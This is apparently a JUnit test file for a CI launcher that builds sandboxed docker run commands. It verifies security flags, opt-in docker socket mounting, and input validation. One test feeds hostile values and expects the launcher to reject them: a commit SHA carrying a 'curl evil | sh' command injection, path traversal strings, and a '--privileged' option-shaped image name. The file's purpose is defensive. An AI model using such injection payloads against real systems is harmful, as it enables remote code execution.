package eu.wohlben.qits.ci.daemonhost;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import eu.wohlben.qits.ci.daemonhost.CiDaemonLauncher.LaunchSpec;
import eu.wohlben.qits.ci.error.BadRequestException;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

/**
 * Argv and bootstrap assembly only — the real {@code docker run} is covered by the extended {@code
 * CiDaemonHandshakeIT}. Worth its own test because the argv <b>is</b> the sandbox: a flag lost in a
 * refactor is invisible everywhere else until it is invisible in production.
 */
public class CiDaemonLauncherTest {

  private CiDaemonLauncher launcher() {
    CiDaemonLauncher launcher = new CiDaemonLauncher();
    launcher.runtime = "docker";
    launcher.network = "qits-net";
    launcher.containerGitUrl = "http://qits-artifacts:8080/artifacts/";
    launcher.containerDaemonUrl = "ws://qits-ci:8080/ci/daemon";
    launcher.daemonVersion = java.util.Optional.of("deadbeef");
    launcher.daemonBinaryUrlTemplate = "http://qits-artifacts:8080/v2/qits/ci-daemon/blobs/sha256:{version}";
    launcher.registerTimeoutSeconds = 60;
    launcher.outputMaxChars = 65536;
    launcher.memoryLimit = "4g";
    launcher.pidsLimit = "2048";
    launcher.cpus = "2";
    launcher.dockerSocketPath = "/var/run/docker.sock";
    launcher.artifactsRegistryHost = "qits-artifacts:8080";
    launcher.artifactsImageRepository = "qits";
    launcher.artifactsNpmHostedUrl = "http://qits-artifacts:8080/artifacts/npm/npm/";
    launcher.artifactsNpmProxyUrl = "http://qits-artifacts:8080/artifacts/npm/npmjs/";
    launcher.artifactsMavenRegistryUrl = "http://qits-artifacts:8080/artifacts/maven/maven";
    launcher.workspacesUrl = "http://qits-workspaces:8080";
    return launcher;
  }

  private final LaunchSpec spec =
      new LaunchSpec(
          "0123456789abcdef-run",
          2,
          "repo-1",
          "main",
          "cafebabe",
          "maven:3.9",
          "daemon-7",
          "s3cr3t",
          "http://qits-artifacts:8080/v2/qits/ci-daemon/blobs/sha256:deadbeef",
          false,
          Map.of());

  /** The same step, having declared {@code docker: true} — the only difference anywhere. */
  private LaunchSpec publishing() {
    return new LaunchSpec(
        spec.runId(),
        spec.stepIndex(),
        spec.repoId(),
        spec.branch(),
        spec.sha(),
        spec.image(),
        spec.daemonId(),
        spec.secret(),
        spec.daemonBinaryUrl(),
        true,
        spec.env());
  }

  @Test
  public void buildsTheDetachedDockerRunArgv() {
    assertEquals(
        List.of(
            "docker",
            "run",
            "-d",
            "--name",
            "qits-ci-01234567-2",
            "--network",
            "qits-net",
            "--add-host=host.docker.internal:host-gateway",
            "--label",
            "qits.ci.run=0123456789abcdef-run",
            "--security-opt=no-new-privileges",
            "--cap-drop=ALL",
            "--memory",
            "4g",
            "--memory-swap",
            "4g",
            "--pids-limit",
            "2048",
            "--cpus",
            "2",
            "--env",
            "QITS_CI_DAEMON_ID=daemon-7",
            "--env",
            "QITS_CI_DAEMON_SECRET=s3cr3t",
            "--env",
            "QITS_CI_DAEMON_URL=ws://qits-ci:8080/ci/daemon",
            "--env",
            "QITS_CI_DAEMON_BINARY_URL=http://qits-artifacts:8080/v2/qits/ci-daemon/blobs/sha256:deadbeef",
            "--env",
            "QITS_CI_REPOSITORY_URL=http://qits-artifacts:8080/artifacts/git/repo-1",
            "--env",
            "QITS_CI_BRANCH=main",
            "--env",
            "QITS_CI_SHA=cafebabe",
            "--env",
            "QITS_CI_REPO_ID=repo-1",
            "--env",
            "CI=true",
            "--env",
            "QITS_CI=true",
            "--env",
            "QITS_REGISTRY=qits-artifacts:8080",
            "--env",
            "QITS_IMAGE_REPOSITORY=qits",
            "--env",
            "QITS_NPM_REGISTRY_URL=http://qits-artifacts:8080/artifacts/npm/npm/",
            "--env",
            "QITS_NPM_PROXY_URL=http://qits-artifacts:8080/artifacts/npm/npmjs/",
            "--env",
            "QITS_MAVEN_REGISTRY_URL=http://qits-artifacts:8080/artifacts/maven/maven",
            "--env",
            "QITS_WORKSPACES_URL=http://qits-workspaces:8080",
            "--entrypoint",
            "/bin/sh",
            "maven:3.9",
            "-c",
            CiDaemonLauncher.BOOTSTRAP),
        launcher().buildArgv(spec));
  }

  @Test
  public void aStepThatDeclaredDockerGetsTheHostSocketAndOnlyThat() {
    List<String> plain = launcher().buildArgv(spec);
    List<String> withDocker = launcher().buildArgv(publishing());

    // The mount is there, at the same path on both sides so the step image's CLI finds it by default.
    int mount = withDocker.indexOf("-v");
    assertTrue(mount >= 0, withDocker.toString());
    assertEquals("/var/run/docker.sock:/var/run/docker.sock", withDocker.get(mount + 1));

    // And it is the ONLY difference: the sandbox does not relax for a publish step, because cap-drop
    // and no-new-privileges cost a socket client nothing and keeping them unconditional is what keeps
    // them meaning something for the steps that never opt in.
    List<String> withoutTheMount = new java.util.ArrayList<>(withDocker);
    withoutTheMount.subList(mount, mount + 2).clear();
    assertEquals(plain, withoutTheMount, "declaring docker must add a mount and change nothing else");
    assertTrue(withDocker.contains("--cap-drop=ALL"), withDocker.toString());
    assertTrue(withDocker.contains("--security-opt=no-new-privileges"), withDocker.toString());
  }

  @Test
  public void aStepThatDeclaredNothingGetsNoDockerSocketAtAll() {
    // THIS is the security assertion of the pair — the absence, not the presence. A step's script is
    // repo-controlled code and the docker socket is root on the host, so "no socket unless the config
    // said so" is the invariant, and an accidental unconditional mount would be invisible everywhere
    // else in this repository until it was invisible in production.
    List<String> argv = launcher().buildArgv(spec);
    assertFalse(argv.contains("-v"), argv.toString());
    assertFalse(argv.contains("--volume"), argv.toString());
    for (String arg : argv) {
      assertFalse(arg.contains("docker.sock"), "no step may see a docker socket it did not ask for: " + arg);
    }
  }

  @Test
  public void everyStepIsToldWhereAPublishedImageGoes() {
    // Injected unconditionally, opted in or not: "which registry" must never be a literal in a
    // repository's pipeline. With $QITS_CI_SHA these two are the whole tag convention qits-cd pulls
    // by, and they are named after their owner because qits-cd ships the same pair.
    for (LaunchSpec each : List.of(spec, publishing())) {
      List<String> argv = launcher().buildArgv(each);
      assertTrue(argv.contains("QITS_REGISTRY=qits-artifacts:8080"), argv.toString());
      assertTrue(argv.contains("QITS_IMAGE_REPOSITORY=qits"), argv.toString());
      assertTrue(argv.contains("QITS_CI_SHA=cafebabe"), argv.toString());
    }
  }

  @Test
  public void everyStepIsToldWhereNpmPackagesComeFromAndGoTo() {
    // Also unconditional, and for the same reason — but note what changes about the reasoning: these
    // two are dialled by the step container itself over the shared network, so a publish to them is
    // an ordinary HTTP step that never declares `docker: true`, and the in-network alias is the
    // value that is CORRECT here rather than the one a host-published mapping replaces.
    for (LaunchSpec each : List.of(spec, publishing())) {
      List<String> argv = launcher().buildArgv(each);
      assertTrue(
          argv.contains("QITS_NPM_REGISTRY_URL=http://qits-artifacts:8080/artifacts/npm/npm/"),
          argv.toString());
      assertTrue(
          argv.contains("QITS_NPM_PROXY_URL=http://qits-artifacts:8080/artifacts/npm/npmjs/"),
          argv.toString());
    }
  }

  @Test
  public void everyStepIsToldWhereMavenPackagesComeFromAndGoTo() {
    for (LaunchSpec each : List.of(spec, publishing())) {
      List<String> argv = launcher().buildArgv(each);
      assertTrue(
          argv.contains(
              "QITS_MAVEN_REGISTRY_URL=http://qits-artifacts:8080/artifacts/maven/maven"),
          argv.toString());
    }
  }

  @Test
  public void everyStepIsToldWhereToAskForItsOwnRepositoryToBeReleased() {
    // The release train's maintenance step POSTs to qits-workspaces after the tests it follows went
    // green. Unconditional and container-dialled for the same reasons as the npm pair: the file
    // states no deployment fact, and the in-network alias is what a step container can reach.
    for (LaunchSpec each : List.of(spec, publishing())) {
      assertTrue(
          launcher().buildArgv(each).contains("QITS_WORKSPACES_URL=http://qits-workspaces:8080"),
          launcher().buildArgv(each).toString());
    }
  }

  @Test
  public void theContainerIsDetachedAndNotSelfRemoving() {
    List<String> argv = launcher().buildArgv(spec);
    assertTrue(argv.contains("-d"), argv.toString());
    // --rm would race the `docker logs` capture that is the only diagnosis a container which never
    // registered can offer; every teardown is an explicit `docker rm -f` instead.
    assertFalse(argv.contains("--rm"), argv.toString());
  }

  @Test
  public void theBootstrapInterpolatesNothingAtAll() {
    String bootstrap = CiDaemonLauncher.BOOTSTRAP;
    // Every value the container needs is a shell variable it reads from its own environment. If any
    // of these appeared in the text, a repository would have found a way into a command line.
    for (String value :
        List.of("repo-1", "cafebabe", "main", "daemon-7", "s3cr3t", "maven:3.9", "qits-artifacts")) {
      assertFalse(bootstrap.contains(value), "bootstrap must not carry '" + value + "'");
    }
    assertEquals(bootstrap, launcher().buildArgv(spec).getLast());
    // ...and the invariant the whole feature rests on: no repo-controlled code in a host argv.
    assertFalse(bootstrap.contains("bash -c"), bootstrap);
    assertFalse(bootstrap.contains("docker"), bootstrap);
  }

  @Test
  public void theBootstrapProbesBothDownloadersAndSaysSoWhenItHasNeither() {
    String bootstrap = CiDaemonLauncher.BOOTSTRAP;
    assertTrue(bootstrap.contains("command -v wget"), bootstrap);
    assertTrue(bootstrap.contains("command -v curl"), bootstrap);
    // The image contract, stated in the container's own log — which is what the never-registered
    // reap captures, so an image missing a downloader diagnoses itself.
    assertTrue(bootstrap.contains("neither wget nor curl"), bootstrap);
    assertTrue(bootstrap.contains("chmod +x /tmp/qits-ci-daemon"), bootstrap);
    // exec, so the daemon is PID 1 and a `docker rm -f` signals it rather than a wrapping shell.
    assertTrue(bootstrap.contains("exec /tmp/qits-ci-daemon"), bootstrap);
  }

  @Test
  public void theBinaryUrlIsTheVersionResolvedIntoTheTemplate() {
    // One template rather than two free values, so the version pin and the download address cannot
    // drift apart. The {version} is the binary's sha256, which makes it the integrity pin too.
    assertEquals(
        "http://qits-artifacts:8080/v2/qits/ci-daemon/blobs/sha256:abc123",
        launcher().resolveBinaryUrl("abc123"));
    assertEquals("deadbeef", launcher().daemonVersion());
  }

  @Test
  public void theCloneUrlEndsAtTheServiceAndCiAppendsTheGitSegment() {
    assertEquals("http://qits-artifacts:8080/artifacts/git/repo-1", launcher().cloneUrl("repo-1"));
  }

  @Test
  public void hostileIdentifiersAreRejectedBeforeAnyDockerCall() {
    CiDaemonLauncher launcher = launcher();
    LaunchSpec injectedSha =
        new LaunchSpec("run", 0, "repo-1", "main", "x\"; curl evil | sh #", "img", "d", "s", "u", false, Map.of());
    assertThrows(BadRequestException.class, () -> launcher.launch(injectedSha));
    LaunchSpec traversal =
        new LaunchSpec("run", 0, "../../etc", "main", "cafebabe", "img", "d", "s", "u", false, Map.of());
    assertThrows(BadRequestException.class, () -> launcher.launch(traversal));
    LaunchSpec injectedBranch =
        new LaunchSpec("run", 0, "repo-1", "main/../..", "cafebabe", "img", "d", "s", "u", false, Map.of());
    assertThrows(BadRequestException.class, () -> launcher.launch(injectedBranch));
    // The image is repo-declared rather than intake-supplied, and it is a positional argument to the
    // docker CLI. Nothing is known to get through it — ProcessBuilder does not shell-split and the
    // trailing `-c <BOOTSTRAP>` defeats the obvious re-parses — but an argument that can be read as
    // an option is not a thing to leave to the parser's good manners.
    LaunchSpec optionShapedImage =
        new LaunchSpec("run", 0, "repo-1", "main", "cafebabe", "--privileged", "d", "s", "u", false, Map.of());
    assertThrows(BadRequestException.class, () -> launcher.launch(optionShapedImage));
    LaunchSpec blankImage =
        new LaunchSpec("run", 0, "repo-1", "main", "cafebabe", "  ", "d", "s", "u", false, Map.of());
    assertThrows(BadRequestException.class, () -> launcher.launch(blankImage));
  }

  @Test
  public void shortRunIdsAreUsedWholeInTheContainerName() {
    assertEquals("qits-ci-abc-0", CiDaemonLauncher.containerName("abc", 0));
  }
}
